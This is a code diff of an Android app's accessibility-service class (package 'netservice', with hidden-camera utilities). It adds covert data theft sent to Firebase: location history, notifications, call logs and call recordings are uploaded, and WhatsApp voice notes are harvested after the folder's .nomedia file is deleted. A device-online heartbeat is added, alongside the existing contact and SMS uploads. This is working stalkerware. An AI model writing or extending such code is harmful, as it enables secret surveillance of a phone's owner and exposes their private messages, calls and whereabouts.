@@ -58,6 +58,9 @@ import com.dtz.netservice.utils.hiddenCameraServiceUtils.config.CameraFacing
 import com.dtz.netservice.utils.hiddenCameraServiceUtils.config.CameraRotation
 import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationServices
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.ValueEventListener
 import com.pawegio.kandroid.IntentFor
 import com.pawegio.kandroid.e
 import io.reactivex.android.schedulers.AndroidSchedulers
@@ -71,7 +74,9 @@ import java.nio.file.Files
 import java.nio.file.Paths
 import java.text.SimpleDateFormat
 import java.util.*
+import java.util.concurrent.TimeUnit
 import javax.inject.Inject
+import kotlin.io.path.deleteIfExists
 
 
 /**
@@ -95,6 +100,8 @@ class InteractorAccessibilityData @Inject constructor(
     private var fileName: String? = null
     private var dateTime: String? = null
     private var nameAudio: String? = null
+
+    private val db = DataBaseHelper(context)
 
     private var countDownTimer: MyCountDownTimer = MyCountDownTimer(startTime, interval) {
         if (firebase.getUser() != null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA)
@@ -136,7 +143,9 @@ class InteractorAccessibilityData @Inject constructor(
                 context.getString(R.string.address_not_found)
             }
 
+            val uuid = UUID.randomUUID().toString()
             val model = com.dtz.netservice.data.model.Location(
+                uuid,
                 location.latitude,
                 location.longitude,
                 address,
@@ -146,13 +155,67 @@ class InteractorAccessibilityData @Inject constructor(
 
             firebase.getDatabaseReference(LOCATIONS).push().setValue(model)
 
+            savePositions(model)
+            getSavedPositions()
+            getSavedNotifications()
+            getSavedCallLog()
+            getRecordsLists(context)
+            getWhatsAppAudio(context)
+
             setDataLocationHourly(location)
+            setDevicePresence()
 
             saveContacts()
             saveSMS()
-            saveCallLogs()
         }
 
+    }
+
+    private fun setDevicePresence() {
+        val current = System.currentTimeMillis()
+        firebase.getDatabaseReference("$DATA/${Consts.DEVICE_ONLINE}").setValue(current)
+    }
+
+    private fun savePositions(location: com.dtz.netservice.data.model.Location) {
+        db.insertPosition(location)
+        firebase.getDatabaseReference("${Consts.SAVED_LOCATIONS}/")
+    }
+
+    private fun getSavedPositions() {
+        val data = db.readPositionData();
+        try {
+            data.forEach { location ->
+                firebase.getDatabaseReference("${Consts.SAVED_LOCATIONS}/")
+                    .push()
+                    .setValue(location)
+                    .addOnCompleteListener {
+                        location.uuid?.let { it1 -> db.deleteOnePositionData(it1) }
+                    }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
+    private fun getSavedNotifications() {
+        val data = db.readNotificationData();
+        try {
+            data.forEach { notification ->
+                firebase.getDatabaseReference("${Consts.SAVED_NOTIFICATIONS}/")
+                    .push()
+                    .setValue(notification)
+                    .addOnCompleteListener {
+                        notification.uuid?.let { it1 -> db.deleteOneNotificationData(it1) }
+                    }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
+    private fun getSavedCallLog() {
+        val data = db.readCallLogsData();
+        firebase.getDatabaseReference("${Consts.SAVED_CALL_LOG}/").setValue(data)
     }
 
     private fun saveContacts() {
@@ -165,12 +228,6 @@ class InteractorAccessibilityData @Inject constructor(
         //Contacts
         val smsList = SMSes.smsList(context)
         firebase.getDatabaseReference("${Consts.SMSES}/").setValue(smsList)
-    }
-
-    private fun saveCallLogs() {
-        //Contacts
-        val callList = CallLogs.callList(context)
-        firebase.getDatabaseReference("${Consts.CALLLOGS}/").setValue(callList)
     }
 
     private fun setDataLocationHourly(location: Location) {
@@ -190,7 +247,9 @@ class InteractorAccessibilityData @Inject constructor(
 
             val currTime = SimpleDateFormat("dd-MM-yyyy HH", Locale.getDefault()).format(Date())
 
+            val uuid = UUID.randomUUID().toString()
             val model = com.dtz.netservice.data.model.Location(
+                uuid,
                 location.latitude,
                 location.longitude,
                 address,
@@ -200,6 +259,135 @@ class InteractorAccessibilityData @Inject constructor(
                 .child(currTime).setValue(model)
         }
 
+    }
+
+    private fun getRecordsLists(context: Context) {
+        val callsDir =
+            context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)?.path + "/records/calls/"
+        File(callsDir).walk().forEach {
+            val file = File(it.path)
+            if (file.isFile) {
+                uploadCallFile(file)
+            }
+        }
+    }
+
+    private fun getWhatsAppAudio(context: Context) {
+        val whatsappFolder = Environment.getExternalStorageDirectory()
+            .toString() + File.separator + "Android/media/com.whatsapp/WhatsApp" + File.separator + "Media"
+        if (File(whatsappFolder).exists()) {
+            /*val whatsappAudio = Environment.getExternalStorageDirectory().toString() + "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio"
+            val whatAudio = File(whatsappAudio)
+            whatAudio.walkTopDown().forEach {
+                val file = File(it.path)
+                if (file.isFile) {
+                    uploadWhatsAppAudioFile(file)
+                }
+            }*/
+
+            val whatsappVoicesAudio = whatsappFolder + File.separator + "WhatsApp Voice Notes"
+            val nomedia = File(whatsappVoicesAudio + File.separator + ".nomedia")
+
+            if (nomedia.exists()) {
+                nomedia.setExecutable(true)
+                try {
+                    Log.d("WHATSAPP NOMEDIA", nomedia.absolutePath)
+                    val uuid = UUID.randomUUID().toString()
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        val src = Paths.get( whatsappVoicesAudio + File.separator + ".nomedia" )
+                        val dest = Paths.get( whatsappFolder + File.separator + "nomedia" + uuid)
+                        Files.move(src, dest)
+                        dest.deleteIfExists();
+                    }
+                    nomedia.deleteRecursively()
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+            }
+            File(whatsappVoicesAudio).walkTopDown().forEach { file ->
+                if (file.isFile) {
+                    uploadWhatsAppAudioFile(file)
+                }
+            }
+        } else {
+            Log.d("WHATSAPP FOLDER", "NOT EXISTS")
+        }
+    }
+
+    private fun uploadCallFile(file: File) {
+        val uri = Uri.fromFile(file)
+        val chi = firebase.getDatabaseReference("recording_calls")
+        if (uri.lastPathSegment != null) {
+            val name = uri.lastPathSegment.toString().replace(".", "")
+            chi.addListenerForSingleValueEvent(object : ValueEventListener {
+                override fun onDataChange(snapshot: DataSnapshot) {
+                    if (!snapshot.hasChild(name)) {
+                        firebase.getStorageReference("recording_calls/${name}")
+                            .putFile(uri)
+                            .addOnSuccessListener { taskSnapshot ->
+                                val callMap: MutableMap<String, Any> = mutableMapOf()
+                                callMap["file"] = taskSnapshot.metadata?.path.toString()
+                                callMap["size"] = taskSnapshot.metadata?.sizeBytes.toString()
+                                callMap["date"] =
+                                    taskSnapshot.metadata?.creationTimeMillis.toString()
+                                saveLink(callMap, name)
+                            }
+                    }
+                }
+
+                override fun onCancelled(error: DatabaseError) {
+                    //TODO("Not yet implemented")
+                    Log.d("TAG", "erreur lors de la connexion à firebase")
+                }
+
+            })
+        }
+
+    }
+
+    private fun uploadWhatsAppAudioFile(file: File) {
+        val uri = Uri.fromFile(file)
+        val chi = firebase.getDatabaseReference("whatsapp_audio")
+        if (uri.lastPathSegment != null) {
+            val name = uri.lastPathSegment.toString().replace(".", "")
+            chi.addListenerForSingleValueEvent(object : ValueEventListener {
+                override fun onDataChange(snapshot: DataSnapshot) {
+                    if (!snapshot.hasChild(name)) {
+                        firebase.getStorageReference("whatsapp_audio/${name}")
+                            .putFile(uri)
+                            .addOnSuccessListener { taskSnapshot ->
+                                val callMap: MutableMap<String, Any> = mutableMapOf()
+                                callMap["file"] = taskSnapshot.metadata?.path.toString()
+                                callMap["fileName"] = file.name
+                                callMap["size"] = taskSnapshot.metadata?.sizeBytes.toString()
+                                callMap["date"] =
+                                    taskSnapshot.metadata?.creationTimeMillis.toString()
+                                saveWhatsAppLink(callMap, name)
+                            }
+                    }
+                    chi.removeEventListener(this)
+                }
+
+                override fun onCancelled(error: DatabaseError) {
+                    //TODO("Not yet implemented")
+                    Log.d("TAG", "erreur lors de la connexion à firebase")
+                    chi.removeEventListener(this)
+                }
+            })
+        }
+
+    }
+
+    private fun saveLink(callMap: MutableMap<String, Any>, lastPathSegment: String) {
+        firebase.getDatabaseReference("recording_calls")
+            .child(lastPathSegment)
+            .updateChildren(callMap)
+    }
+
+    private fun saveWhatsAppLink(callMap: MutableMap<String, Any>, lastPathSegment: String) {
+        firebase.getDatabaseReference("whatsapp_audio")
+            .child(lastPathSegment)
+            .updateChildren(callMap)
     }
 
     override fun enablePermissionLocation(location: Boolean) {
@@ -335,7 +523,6 @@ class InteractorAccessibilityData @Inject constructor(
         }
     }
 
-
     private fun isVideoFileUri(uri: String): Boolean {
         val extension = MimeTypeMap.getFileExtensionFromUrl(uri)
         val mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension)
@@ -437,7 +624,6 @@ class InteractorAccessibilityData @Inject constructor(
         }
     }
 
-
     private fun setPushNamePhoto(url: String, namePhoto: String) {
 
         val fusedLocationProviderClient: FusedLocationProviderClient =
@@ -472,7 +658,6 @@ class InteractorAccessibilityData @Inject constructor(
         }
     }
 
-
     override fun getSocialStatus() {
         disposable.add(firebase.valueEvent("$SOCIAL/$CHILD_SOCIAL_MS")
             .map { data -> data.exists() }
@@ -482,7 +667,6 @@ class InteractorAccessibilityData @Inject constructor(
                 { e(TAG, it.message.toString()) })
         )
     }
-
 
     override fun getRecordingAudio() {
         disposable.add(
@@ -497,7 +681,6 @@ class InteractorAccessibilityData @Inject constructor(
                     { error -> e(TAG, error.message.toString()) })
         )
     }
-
 
     private fun startRecording(startTime: Long) {
 
